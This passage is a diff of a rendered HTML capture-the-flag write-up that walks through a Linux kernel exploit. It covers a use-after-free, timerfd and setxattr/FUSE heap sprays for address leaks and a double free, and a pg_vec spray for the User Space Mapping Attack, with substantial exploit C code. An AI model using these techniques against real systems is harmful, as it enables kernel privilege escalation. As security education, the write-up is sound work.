 <p>At this point, the refcount of book 0 is equals to 1. This would pass the refcount check in DO_DELETE, allowing us to free the book object. Once the book object is freed, we can spray timerfd_ctx to reclaim the victim object and to obtain a kernel heap (kmalloc-256, and this would be the address of the victim object) and text leak. The timerfd spray works as after the victim object has been reclaimed, idx remains 0, which allows the ioctl function to walk the linked list to find the victim object. Before performing DO_READ, we will use DO_NOTE to ensure that note_addr is not zero so that DO_READ will not cause a kernel oops.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>    <span style="color:#75715e">// Delete book 0 to get UAF
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">delete_book</span>(<span style="color:#ae81ff">0</span>); 
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>    <span style="color:#75715e">// Delete book 0 to get UAF
+</span></span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">delete_book</span>(<span style="color:#ae81ff">0</span>); 
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Spray timerfds to reclaim UAF object
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Spraying timerfds</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Spraying timerfds</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> NUM_TIMERFDS; i<span style="color:#f92672">++</span>) {
 </span></span><span style="display:flex;"><span>        timerfds[i] <span style="color:#f92672">=</span> <span style="color:#a6e22e">timerfd_create</span>(CLOCK_REALTIME, <span style="color:#ae81ff">0</span>); 
 </span></span><span style="display:flex;"><span>        timerValue.it_value.tv_sec <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
@@ -581,10 +581,10 @@
 </span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">1</span>);
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Replace the note so that it doesn&#39;t crash
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">note_book</span>(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x10</span>, note); 
+</span></span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">note_book</span>(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x10</span>, note); 
 </span></span><span style="display:flex;"><span>    
 </span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Read to get leaks
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">memset</span>(name, <span style="color:#ae81ff">0x0</span>, <span style="color:#66d9ef">sizeof</span>(name)); 
+</span></span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memset</span>(name, <span style="color:#ae81ff">0x0</span>, <span style="color:#66d9ef">sizeof</span>(name)); 
 </span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memset</span>(note, <span style="color:#ae81ff">0x0</span>, <span style="color:#66d9ef">sizeof</span>(note)); 
 </span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memset</span>(info, <span style="color:#ae81ff">0x0</span>, <span style="color:#66d9ef">sizeof</span>(info)); 
 </span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">read_book</span>(<span style="color:#ae81ff">0</span>, name, note, info);
@@ -604,7 +604,7 @@
 <p>At this point, we have a UAF primitive on a struct book object, as well as kernel text and heap leaks. We can turn the UAF into a double free by leveraging a potential arbitrary free primitive, provided we are able to control the data inside the victim object.</p>
 <p>Usually, at this point, I would turn to my favourite kernel object: msg_msg, but while writing this challenge we intended to block the cross cache attack with CONFIG_SLAB_VIRTUAL. As msg_msg is allocated with the GFP_KERNEL_ACCOUNT flag, it would end up in a kmalloc-cg cache, which would require cross cache. Furthermore, as we planned to use pg_vec (also allocated in a normal kmalloc cache) for USMA later on, we ended up using the <a href="https://duasynt.com/blog/linux-kernel-heap-spray">setxattr + FUSE heap spray developed by Vitaly Nikolenko</a>.</p>
 <p>The code path for the setxattr (for kernel version 6.10.4) is:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>setxattr
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>setxattr
 </span></span><span style="display:flex;"><span>    <span style="color:#f92672">-&gt;</span> setxattr_copy
 </span></span><span style="display:flex;"><span>        <span style="color:#f92672">-&gt;</span> vmemdup_user
 </span></span><span style="display:flex;"><span>
@@ -696,31 +696,31 @@
 <p>So back to the setxattr spray. After memory is allocated by vmemdup_user and all the other operations in the function are performed, the allocated region kvalue is freed before the setxattr function returns. Essentially, this means that the target spray object is allocated and freed in the same code path. However, in order for the spray to be effective, we should be able to control when the object is allocated and freed. This is where FUSE comes in.</p>
 <p>FUSE (Filesystem in UserSpacE) basically allows non-privileged users to create their own filesystem and define handlers for some filesystem syscalls without modifying kernel code. Basically, the idea is to use FUSE to help us block on copy_from_user (in vmemdup_user), allowing most of our data to be copied into kernel memory and for the allocated object to persist until we need to free it (by unblocking).</p>
 <p>Remember that we started the FUSE filesystem in the setup portion of the exploit? The read handler of the FUSE filesystem was defined as such:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">do_read</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>path, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>buf, <span style="color:#66d9ef">size_t</span> size, <span style="color:#66d9ef">off_t</span> offset, <span style="color:#66d9ef">struct</span> fuse_file_info <span style="color:#f92672">*</span>fi)  {
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">do_read</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>path, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>buf, <span style="color:#66d9ef">size_t</span> size, <span style="color:#66d9ef">off_t</span> offset, <span style="color:#66d9ef">struct</span> fuse_file_info <span style="color:#f92672">*</span>fi)  {
 </span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">dprintf</span>(<span style="color:#ae81ff">666</span>, <span style="color:#e6db74">&#34;--&gt; Trying to read %s, %u, %u</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, path, offset, size);
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> signal; 
 </span></span><span style="display:flex;"><span>    
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strcmp</span>(path, <span style="color:#e6db74">&#34;/exp&#34;</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
 </span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">dprintf</span>(<span style="color:#ae81ff">666</span>, <span style="color:#e6db74">&#34;[+] FUSE: Block 1 reached</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
 </span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">read</span>(fuse_pipe1[<span style="color:#ae81ff">0</span>], <span style="color:#f92672">&amp;</span>signal, <span style="color:#ae81ff">1</span>); <span style="color:#75715e">// Block here
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">dprintf</span>(<span style="color:#ae81ff">666</span>, <span style="color:#e6db74">&#34;[+] FUSE: Block 1 released</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">dprintf</span>(<span style="color:#ae81ff">666</span>, <span style="color:#e6db74">&#34;[+] FUSE: Block 1 released</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
 </span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strcmp</span>(path, <span style="color:#e6db74">&#34;/exp2&#34;</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
 </span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">dprintf</span>(<span style="color:#ae81ff">666</span>, <span style="color:#e6db74">&#34;[+] FUSE: Block 2 reached</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
 </span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">read</span>(fuse_pipe2[<span style="color:#ae81ff">0</span>], <span style="color:#f92672">&amp;</span>signal, <span style="color:#ae81ff">1</span>); <span style="color:#75715e">// Block here
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">dprintf</span>(<span style="color:#ae81ff">666</span>, <span style="color:#e6db74">&#34;[+] FUSE: Block 2 released</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">dprintf</span>(<span style="color:#ae81ff">666</span>, <span style="color:#e6db74">&#34;[+] FUSE: Block 2 released</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
 </span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> size; 
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><p>Essentially, this means is that when you try to read from the /exp file, the function will try to read from the socketpair fuse_pipe1 (also set up at the start of the exploit). However, as there is currently nothing inside the socketpair, trying to read from it would cause the function to block.</p>
 <p>In the exploit setup section we also mmapped two contiguous regions of memory, where the fd of the second region of memory (block_map) was set to the fd of the FUSE file.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>    copy_map <span style="color:#f92672">=</span> <span style="color:#a6e22e">mmap</span>((<span style="color:#66d9ef">void</span><span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x1000</span>, <span style="color:#ae81ff">0x1000</span>, PROT_READ <span style="color:#f92672">|</span> PROT_WRITE, MAP_PRIVATE <span style="color:#f92672">|</span> MAP_ANONYMOUS, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>);
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>    copy_map <span style="color:#f92672">=</span> <span style="color:#a6e22e">mmap</span>((<span style="color:#66d9ef">void</span><span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x1000</span>, <span style="color:#ae81ff">0x1000</span>, PROT_READ <span style="color:#f92672">|</span> PROT_WRITE, MAP_PRIVATE <span style="color:#f92672">|</span> MAP_ANONYMOUS, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>);
 </span></span><span style="display:flex;"><span>    block_map <span style="color:#f92672">=</span> <span style="color:#a6e22e">mmap</span>(copy_map<span style="color:#f92672">+</span><span style="color:#ae81ff">0x1000</span>, <span style="color:#ae81ff">0x1000</span>, PROT_READ <span style="color:#f92672">|</span> PROT_WRITE, MAP_PRIVATE, fuse_fd, <span style="color:#ae81ff">0</span>);
 </span></span></code></pre></div><p>This is how the memory looks diagrammatically:</p>
 <p><img src="/images/dead-pwners-society/page-diagram-one.jpg" alt="page diagram one"></p>
 <p>Now, what we are going to do is to place the region of user space data that we want to copy right in the middle of the two pages. Hence, when the kernel tries to perform copy_from_user, it will read the data from the first page normally, but when it reaches the second page, it will block as it tries to perform read from FUSE.</p>
 <p><img src="/images/dead-pwners-society/page-diagram-two.jpg" alt="page diagram two"></p>
 <p>In order to start/stop the spray, I set up a number of spray threads that ran in the background, and used a variable &ldquo;spray1&rdquo; to determine if setxattr was called or not.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">setxattr_worker</span>() {
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">setxattr_worker</span>() {
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> (<span style="color:#ae81ff">1</span>) {
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (spray1 <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>) {
 </span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">cpu_set_t</span> cpu;
@@ -736,43 +736,43 @@
 </span></span><span style="display:flex;"><span>}
 </span></span><span style="display:flex;"><span>...
 </span></span><span style="display:flex;"><span>    <span style="color:#75715e">// in main()
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// Setup setxattr heap spray
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Setup setxattr heap spray</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Setup setxattr heap spray
+</span></span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Setup setxattr heap spray</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> NUM_SETXATTR; i<span style="color:#f92672">++</span>) {
 </span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">pthread_create</span>(<span style="color:#f92672">&amp;</span><span style="color:#66d9ef">thread</span>[i], NULL, setxattr_worker, NULL);
 </span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>    ...
 </span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Setup copy_map for setxattr spray 
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    target_addr <span style="color:#f92672">=</span> block_map<span style="color:#f92672">-</span><span style="color:#ae81ff">8</span><span style="color:#f92672">-</span><span style="color:#ae81ff">128</span>;
+</span></span></span><span style="display:flex;"><span>    target_addr <span style="color:#f92672">=</span> block_map<span style="color:#f92672">-</span><span style="color:#ae81ff">8</span><span style="color:#f92672">-</span><span style="color:#ae81ff">128</span>;
 </span></span><span style="display:flex;"><span>    ((<span style="color:#66d9ef">uint64_t</span><span style="color:#f92672">*</span>)target_addr)[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4141414141414141</span>;
 </span></span><span style="display:flex;"><span>    ((<span style="color:#66d9ef">uint64_t</span><span style="color:#f92672">*</span>)target_addr)[<span style="color:#ae81ff">8</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>; <span style="color:#75715e">// idx
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    ((<span style="color:#66d9ef">uint64_t</span><span style="color:#f92672">*</span>)target_addr)[<span style="color:#ae81ff">14</span>] <span style="color:#f92672">=</span> kheap_256_addr; <span style="color:#75715e">// note_addr 
+</span></span></span><span style="display:flex;"><span>    ((<span style="color:#66d9ef">uint64_t</span><span style="color:#f92672">*</span>)target_addr)[<span style="color:#ae81ff">14</span>] <span style="color:#f92672">=</span> kheap_256_addr; <span style="color:#75715e">// note_addr 
 </span></span></span></code></pre></div><p>We first free the timerfd objects to free the victim object, and then perform the spray:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>    <span style="color:#75715e">// Free timerfds
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Freeing timerfds</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>); 
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>    <span style="color:#75715e">// Free timerfds
+</span></span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Freeing timerfds</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>); 
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> NUM_TIMERFDS<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>; i<span style="color:#f92672">++</span>) {
 </span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">close</span>(timerfds[i]);
 </span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">1</span>);
 </span></span><span style="display:flex;"><span>    
 </span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Spray setxattr x FUSE to reclaim victim object
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Spraying setxattr</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>); 
+</span></span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Spraying setxattr</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>); 
 </span></span><span style="display:flex;"><span>    spray1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>; 
 </span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">1</span>); 
 </span></span><span style="display:flex;"><span>    
 </span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Stop the spray
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Stopping the setxattr spray</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>); 
+</span></span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Stopping the setxattr spray</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>); 
 </span></span><span style="display:flex;"><span>    spray1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; 
 </span></span></code></pre></div><p>At this point, the victim object is reclaimed by the kvalue object from the setxattr spray. This is how the memory looks like on a debugger (you can see the remnants of the timerfd object as well):</p>
 <p><img src="/images/dead-pwners-society/setxattr-first.jpg" alt="First setxattr spray"></p>
 <p>We can then perform the first free of the double free by calling DO_NOTE:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Perform first free of double free</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>); 
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Perform first free of double free</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>); 
 </span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">note_book</span>(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x10</span>, note); 
 </span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">2</span>); 
 </span></span></code></pre></div><p>The second free of the double free will be performed later on by releasing the first setxattr spray.</p>
 <h4 id="user-space-mapping-attack-usma">User Space Mapping Attack (USMA)</h4>
 <p>The User Space Mapping Attack (USMA) was developed by Yong Liu, Jun Yao and Xiaodong Wang, and has been successfully used to exploit CVE-2021-22600. USMA relies on overwriting pg_vec objects, which is an array of kernel heap pointers used by packet_mmap. Basically, when mmap is called on a socket fd, the kernel will call packet_mmap, which takes an address from the pg_vec array, calculates its corresponding physical page [1], and passes the page into vm_insert_page. The page is then inserted into the virtual address space of the current process [2].</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">packet_mmap</span>(<span style="color:#66d9ef">struct</span> file <span style="color:#f92672">*</span>file, <span style="color:#66d9ef">struct</span> socket <span style="color:#f92672">*</span>sock,
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">packet_mmap</span>(<span style="color:#66d9ef">struct</span> file <span style="color:#f92672">*</span>file, <span style="color:#66d9ef">struct</span> socket <span style="color:#f92672">*</span>sock,
 </span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">struct</span> vm_area_struct <span style="color:#f92672">*</span>vma)
 </span></span><span style="display:flex;"><span>{
 </span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> sock <span style="color:#f92672">*</span>sk <span style="color:#f92672">=</span> sock<span style="color:#f92672">-&gt;</span>sk;
@@ -816,8 +816,8 @@
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">for</span> (pg_num <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; pg_num <span style="color:#f92672">&lt;</span> rb<span style="color:#f92672">-&gt;</span>pg_vec_pages; pg_num<span style="color:#f92672">++</span>) {
 </span></span><span style="display:flex;"><span>				page <span style="color:#f92672">=</span> <span style="color:#a6e22e">pgv_to_page</span>(kaddr);                              <span style="color:#75715e">// &lt;-- [1]
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>				err <span style="color:#f92672">=</span> <span style="color:#a6e22e">vm_insert_page</span>(vma, start, page);                 <span style="color:#75715e">// &lt;-- [2]
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>				<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">unlikely</span>(err))
+</span></span></span><span style="display:flex;"><span>				err <span style="color:#f92672">=</span> <span style="color:#a6e22e">vm_insert_page</span>(vma, start, page);                 <span style="color:#75715e">// &lt;-- [2]
+</span></span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">unlikely</span>(err))
 </span></span><span style="display:flex;"><span>					<span style="color:#66d9ef">goto</span> out;
 </span></span><span style="display:flex;"><span>				start <span style="color:#f92672">+=</span> PAGE_SIZE;
 </span></span><span style="display:flex;"><span>				kaddr <span style="color:#f92672">+=</span> PAGE_SIZE;
@@ -840,14 +840,14 @@
 <li>All the pointers in the overwritten pg_vec array must be page aligned.</li>
 </ol>
 <p>Now, let&rsquo;s take a look at how pg_vec is allocated via alloc_pg_vec:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">struct</span> pgv <span style="color:#f92672">*</span><span style="color:#a6e22e">alloc_pg_vec</span>(<span style="color:#66d9ef">struct</span> tpacket_req <span style="color:#f92672">*</span>req, <span style="color:#66d9ef">int</span> order)
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">struct</span> pgv <span style="color:#f92672">*</span><span style="color:#a6e22e">alloc_pg_vec</span>(<span style="color:#66d9ef">struct</span> tpacket_req <span style="color:#f92672">*</span>req, <span style="color:#66d9ef">int</span> order)
 </span></span><span style="display:flex;"><span>{
 </span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> block_nr <span style="color:#f92672">=</span> req<span style="color:#f92672">-&gt;</span>tp_block_nr;
 </span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> pgv <span style="color:#f92672">*</span>pg_vec;
 </span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> i;
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>	pg_vec <span style="color:#f92672">=</span> <span style="color:#a6e22e">kcalloc</span>(block_nr, <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">struct</span> pgv), GFP_KERNEL <span style="color:#f92672">|</span> __GFP_NOWARN); <span style="color:#75715e">// &lt;-- [3]
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">unlikely</span>(<span style="color:#f92672">!</span>pg_vec))
+</span></span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">unlikely</span>(<span style="color:#f92672">!</span>pg_vec))
 </span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">goto</span> out;
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> (i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> block_nr; i<span style="color:#f92672">++</span>) {
@@ -865,7 +865,7 @@
 </span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">goto</span> out;
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><p>We know that as pg_vec is allocated with GFP_KERNEL, it will end up in a normal kmalloc cache. To control the size of the pg_vec array, all we need to do is to control block_nr [3]. To spray pg_vec, we can do the following (thanks Shunt):</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">spray_pg_vec</span>(<span style="color:#66d9ef">uint64_t</span> size) {
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">spray_pg_vec</span>(<span style="color:#66d9ef">uint64_t</span> size) {
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> s <span style="color:#f92672">=</span> <span style="color:#a6e22e">socket</span>(AF_PACKET, SOCK_RAW, <span style="color:#ae81ff">0</span>);
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> pkt_ver <span style="color:#f92672">=</span> TPACKET_V3;
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint32_t</span> blocksiz <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1000</span>, framesiz <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1000</span> <span style="color:#f92672">/</span> <span style="color:#ae81ff">2</span>;
@@ -887,8 +887,8 @@
 </span></span><span style="display:flex;"><span>}
 </span></span><span style="display:flex;"><span>...
 </span></span><span style="display:flex;"><span>    <span style="color:#75715e">// In main()
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// Spray pg_vec
